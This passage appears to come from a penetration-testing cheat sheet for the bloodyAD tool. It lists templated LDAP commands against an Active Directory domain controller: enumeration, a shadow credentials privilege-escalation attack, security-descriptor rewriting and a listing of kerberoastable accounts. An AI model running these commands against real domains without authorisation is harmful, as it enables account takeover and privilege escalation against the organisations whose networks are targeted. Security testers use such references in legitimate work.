## MSLDAP sam2dn

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch the DN of an object based on the sAMAccountName.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sam2dn <sAMAccountName>
```

## MSLDAP schemaentry

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch a schema object entry based on the DN.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap schemaentry <cn>
```

## MSLDAP setsd

#platform/Windows #target/REMOTE #protocol/LDAP #cat/OBJECT_MANAGEMENT #experimental

Update the security descriptor of an object.
target_dn: CN=target_object,CN=Users,DC=domain,DC=com
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap setsd <target_dn> <sddl>
```

## MSLDAP shadowcred

#platform/Windows #target/REMOTE #protocol/LDAP #cat/PRIVESC #experimental

Execute shadowcred attack.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap shadowcred <targetuser>
```

## MSLDAP sid2dn

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch the DN of an object based on the objectSid.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sid2dn <sid>
```

## MSLDAP sidresolv

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Return the domain and username for a SID.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sidresolv <sid>
```

## MSLDAP spns

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch kerberoastable user accounts.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap spns
```

## MSLDAP tree

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Print a tree from the given DN with specified depth.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap tree
```

## MSLDAP trusts

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch domain trusts.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap trusts
```

## MSLDAP unconstrained

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

List all unconstrained delegation objects.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap unconstrained
```

## MSLDAP unlockuser

#platform/Windows #target/REMOTE #protocol/LDAP #cat/USER_MANAGEMENT #experimental

Unlock a user account by setting lockoutTime to 0.
user_dn: CN=target_user,CN=Users,DC=domain,DC=com

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap unlockuser <user_dn>
```

## MSLDAP user

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Fetch a user object based on the sAMAccountName.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap user <samaccountname>
```

## MSLDAP whoami

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Full whoami information.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap whoami
```

## MSLDAP whoamiraw

#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental

Simple whoami information.

```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap whoamiraw
```